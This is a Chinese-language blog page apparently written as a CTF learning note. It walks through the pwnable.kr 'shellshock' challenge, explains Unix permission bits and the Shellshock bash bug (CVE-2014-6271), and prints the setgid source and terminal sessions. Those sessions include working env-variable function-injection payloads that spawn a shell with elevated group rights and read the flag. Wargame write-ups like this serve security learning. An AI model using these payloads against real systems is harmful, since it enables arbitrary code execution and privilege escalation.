@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>10-shell | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="补充知识:  UNIX下可以用ls -l 命令来看到文件的权限。用ls命令所得到的表示法的格式是类似这样的：-rwxr-xr-x 。下面解析一下格式所表示的意思。这种表示方法一共有十位：9 8 7 6 5 4 3 2 1 0   r w x r - x r - x第9位表示文件类型,可以为p、d、l、s、c、b和-：p表示命名管道文件d表示目录文件l表示符号连接文件  表示普通文件s表示socke">
+<meta property="og:type" content="article">
+<meta property="og:title" content="10-shell">
+<meta property="og:url" content="http://yoursite.com/2019/05/20/10-shell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="补充知识:  UNIX下可以用ls -l 命令来看到文件的权限。用ls命令所得到的表示法的格式是类似这样的：-rwxr-xr-x 。下面解析一下格式所表示的意思。这种表示方法一共有十位：9 8 7 6 5 4 3 2 1 0   r w x r - x r - x第9位表示文件类型,可以为p、d、l、s、c、b和-：p表示命名管道文件d表示目录文件l表示符号连接文件  表示普通文件s表示socke">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-05-20T12:56:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="10-shell">
+<meta name="twitter:description" content="补充知识:  UNIX下可以用ls -l 命令来看到文件的权限。用ls命令所得到的表示法的格式是类似这样的：-rwxr-xr-x 。下面解析一下格式所表示的意思。这种表示方法一共有十位：9 8 7 6 5 4 3 2 1 0   r w x r - x r - x第9位表示文件类型,可以为p、d、l、s、c、b和-：p表示命名管道文件d表示目录文件l表示符号连接文件  表示普通文件s表示socke">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-10-shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/05/20/10-shell/" class="article-date">
+  <time datetime="2019-05-20T11:26:31.000Z" itemprop="datePublished">2019-05-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      10-shell
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>补充知识:</p>
+<blockquote>
+<p>UNIX下可以用ls -l 命令来看到文件的权限。用ls命令所得到的表示法的格式是类似这样的：-rwxr-xr-x 。下面解析一下格式所表示的意思。这种表示方法一共有十位：<br>9 8 7 6 5 4 3 2 1 0 </p>
+<ul>
+<li>r w x r - x r - x<br>第9位表示文件类型,可以为p、d、l、s、c、b和-：<br>p表示命名管道文件<br>d表示目录文件<br>l表示符号连接文件 </li>
+<li>表示普通文件<br>s表示socket文件<br>c表示字符设备文件<br>b表示块设备文件<br>第8-6位、5-3位、2-0位分别表示文件所有者的权限，同组用户的权限，其他用户的权限，其形式为rwx：<br>r表示可读，可以读出文件的内容<br>w表示可写，可以修改文件的内容<br>x表示可执行，可运行这个程序<br>没有权限的位置用-表示<blockquote>
+<p>-rwsr-xr-x的值为： 1 0 0 1 1 1 1 0 1 1 0 1</p>
+</blockquote>
+</li>
+<li>rw-r-Sr–的值为： 0 1 0 1 1 0 1 0 0 1 0 0<br>姿势来源:<a href="https://blog.csdn.net/findstr/article/details/7330592" target="_blank" rel="noopener">https://blog.csdn.net/findstr/article/details/7330592</a><br>shellshock漏洞原理:<br>1 环境变量的值以()开头表示定义导入函数。在bash启动时，如果存在导入函数，那么这个函数就会被执行。<br>2 调用子进程bash时候，会copy父进程的env，执行导入函数时，bash解析环境变量没有对代码和数据进行边界识别，导致任意代码执行，也就是echo vulnerable。<br>payload:env x=’() { :;}; echo vulnerable’ bash -c “echo this is a test”</li>
+</ul>
+</blockquote>
+<h1 id="shellshock-pwnable-kr"><a href="#shellshock-pwnable-kr" class="headerlink" title="shellshock pwnable.kr"></a>shellshock pwnable.kr</h1><blockquote>
+<p>ssh <a href="mailto:shellshock@pwnable.kr" target="_blank" rel="noopener">shellshock@pwnable.kr</a> -p2222<br>pw:guest</p>
+</blockquote>
+<p>源码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(&quot;/home/shellshock/bash -c &apos;echo shock_me&apos;&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看权限和我现在处于的用户是什么:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ ls -al</span><br><span class="line">total 980</span><br><span class="line">drwxr-x---  5 root shellshock       4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 93 root root             4096 Oct 10  2018 ..</span><br><span class="line">-r-xr-xr-x  1 root shellshock     959120 Oct 12  2014 bash</span><br><span class="line">d---------  2 root root             4096 Oct 12  2014 .bash_history</span><br><span class="line">-r--r-----  1 root shellshock_pwn     47 Oct 12  2014 flag</span><br><span class="line">dr-xr-xr-x  2 root root             4096 Oct 12  2014 .irssi</span><br><span class="line">drwxr-xr-x  2 root root             4096 Oct 23  2016 .pwntools-cache</span><br><span class="line">-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock</span><br><span class="line">-r--r--r--  1 root root              188 Oct 12  2014 shellshock.c</span><br><span class="line"></span><br><span class="line">shellshock@ubuntu:~$ whoami</span><br><span class="line">shellshock</span><br></pre></td></tr></table></figure>
+
+<p>这里我们的用户id是shellshock 而目标文件flag是shellshock_pwn 而在flag前面的权限中 -r–r—–说明所在组是有可读权限的</p>
+<blockquote>
+<p>日常看保护机制,检查shellshock漏洞:</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ checksec shellshock</span><br><span class="line">[*] &apos;/home/shellshock/shellshock&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; bash -c &quot;echo whatever&quot; whatever</span><br><span class="line">whatever</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; echo vulnerable&apos; ./bash -c &quot;echo whatever&quot;</span><br><span class="line">vulnerable</span><br><span class="line">whatever</span><br></pre></td></tr></table></figure>
+
+<p>这里输入’bash’时,没有触发shellshock漏洞;而’./bash’触发了。网上说该服务器没有这个漏洞,而是当前目录下的这个vulnerable的’bash’是供我们练习用的<br>很重要的一点:观察一下shellshock.c的源码，发现它把自己的ruid，euid，suid和rgid，egid，sgid都改成了egid，即shellshock_pwn这个组的effective id。这样它就有权限去读取flag文件了。</p>
+<ul>
+<li>解法:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">shellshock@ubuntu:~$ id</span><br><span class="line">uid=1019(shellshock) gid=1019(shellshock) groups=1019(shellshock)</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; bash&apos; ./shellshock</span><br><span class="line">shellshock@ubuntu:~$ id</span><br><span class="line">uid=1019(shellshock) gid=1020(shellshock_pwn) groups=1020(shellshock_pwn),1019(shellshock)</span><br><span class="line">shellshock@ubuntu:~$ cat flag</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">shellshock@ubuntu:~$ env x=&apos;() &#123; :;&#125;; ./bash -c &quot;cat ./flag&quot;&apos; ./shellshock</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br><span class="line">Segmentation fault(出现段错误)</span><br><span class="line">shellshock@ubuntu:~$ env echo=&quot;() &#123; cat flag;&#125;&quot; /home/shellshock/bash -c &apos;/home/shellshock/shellshock&apos;</span><br><span class="line">only if I knew CVE-2014-6271 ten years ago..!!</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/05/20/10-shell/" data-id="ck0ag4lfx0003h7thkjd5spo6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/05/22/14-cmd1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          14-cmd1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/05/18/XCTF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">XCTF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/07/17/shark-reverse-2/">shark-reverse-2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/15/C-反汇编与逆向分析学习笔记/">C++反汇编与逆向分析学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/12/easy-KeygenMe/">easy_KeygenMe</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/11/reversing-kr-easy-crack/">reversing.kr-easy_crack</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/09/tips/">tips</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
